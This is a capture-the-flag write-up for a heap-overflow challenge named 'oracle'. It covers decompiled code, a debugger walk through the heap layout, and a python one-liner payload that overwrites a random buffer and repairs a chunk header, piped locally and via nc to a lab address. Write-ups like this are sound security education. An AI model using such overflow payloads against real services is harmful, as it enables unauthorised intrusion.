# Getting the challenge

The zip file contains a Dockerfile with some files that describes the service. One of the extra files is a binary that is running with a flag.txt placeholder. This is enough to test everything locally. If your environment differs significantly from the docker image, you can extract the libc from it and use it locally.

Upon running the binary, it asks 2 questions.

Everything is very similar to delphi, see [writeup](../delphi/WRITEUP.md).

![](screenshots/1.png)

# Checking the logic

Ghidra can recover the code ([oracle.c](workdir/oracle.c)) relatively well. 

```c
void FUN_00401334(void *param_1)

{
  size_t __n;
  long in_FS_OFFSET;
  char local_518 [1288];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  fgets(local_518,0x500,stdin);
  __n = strlen(local_518);
  memcpy(param_1,local_518,__n);
  // REDACTED
  return;
}

undefined8 FUN_0040146b(void)

{
  // REDACTED;
  __s = (char *)malloc(0x10);
  __s2 = (char *)malloc(0x20);
  memset(__s2,0,0x20);
  getrandom(__s2,0x20,0);
  for (local_5c = 0; local_5c < 0x20; local_5c = local_5c + 1) {
    if ((__s2[local_5c] == '\0') || (__s2[local_5c] == '\n')) {
      __s2[local_5c] = '*';
    }
  }
  do {
    if (local_60 == 1) {
      puts("You are a true mind reader.");
      FUN_004013b2(); //printing flag out
LAB_0040165d:
      // REDACTED
      return 0;
    }
    puts("Welcome to the Oracle of Delphi!");
    puts("Hic es forsit ut tuum futurum invenias.\n");
    puts(
        "I will think of something bright and shiny. If you manage to think of the same thing, I will predict your future."
        );
    puts("If not, shall the gods have mercy on your soul.\n");
    printf("What shall I think of (ie What\'s my favorite instrument)? ");
    FUN_00401334(__s);
    printf("So you asked: ");
    puts(__s);
    puts("Okay, now that\'s a good one. Let me think...");
    sleep(2);
    printf("Got it. Any clue what it is I had in mind? ");
    fgets(local_48,0x21,stdin);
    iVar1 = strncmp(local_48,__s2,0x20);
    if (iVar1 != 0) {
      puts("Nope, that\'s not it. You\'re doomed.");
      goto LAB_0040165d;
    }
    puts("Just double checking... What did you say? ");
    gets(__s);
    puts("Woah... You got it. Interested in a job offer? We have some good java coffee.");
    free(__s2);
    free(__s);
    local_60 = 1;
  } while( true );
}

```

FUN_00401334 is used to read some input to a large enough buffer, then it copies strlen(buffer) amount into it's parameter deestination. 

FUN_0040146b is presumably the main function, it is allocating 2 buffers (size 0x10 and 0x20) with malloc and randomizing the latter with some filtering. The former is passed to the FUN_00401334 read function to hould our input. A third smaller local buffer is used to read some bytes in the second question, and this value is compared to the random one. Upon successfully guessing the random number, we receive an another chance to read into the input buffer, this time with gets, and the flag is given out.

# The problem

The reader function is ignoring the destination buffer size and overflow can occur. This can overwrite the random part. 

Pwntools can be used to check various protections or generate some cyclic strings to easily spot memory patterns.

![](screenshots/2.png)

The program can be stopped on [malloc](https://cplusplus.com/reference/cstdlib/malloc/) and [strncmp](https://cplusplus.com/reference/cstring/strncmp/) to check the memory layout. 

![](screenshots/5.png)

The strncmp parameters will be passed in `$rdi` (guess), `$rsi` (random), `$rdx` (length).

During a normal run, at `$rsi-32` the input string for the first question can be seen, and at `$rsi`, the randomly generated variable.

![](screenshots/3.png)

During a run with overflow, the random is overwritten with the given input.

![](screenshots/4.png)

# Exploit

The allocated heap structure is deterministic, always allocating the same size in the same order.

The first question can overwrite the random with known value and the second question can use the known value. The program is using free before printing out the flag, so corrupting the heap structure is a problem this time. 


![](screenshots/6.png)


There is a second read to the input buffer after the check with gets, and can restore the corrupted heap structure. Writing back the fixed structure fixing the problem.

```bash
python -c 'print("A"*32+"X"*31+"\n"+"X"*31+"\n"+"A"*24+"\x31\x00\x00\x00\x00\x00\x00\x00")' | ./oracle
python -c 'print("A"*32+"X"*31+"\n"+"X"*31+"\n"+"A"*24+"\x31\x00\x00\x00\x00\x00\x00\x00")' | nc 10.10.8.XX XXXX
```

![](screenshots/8.png)

TODO: replace screenshot from live environment

# Flag

TODO: add flag from live env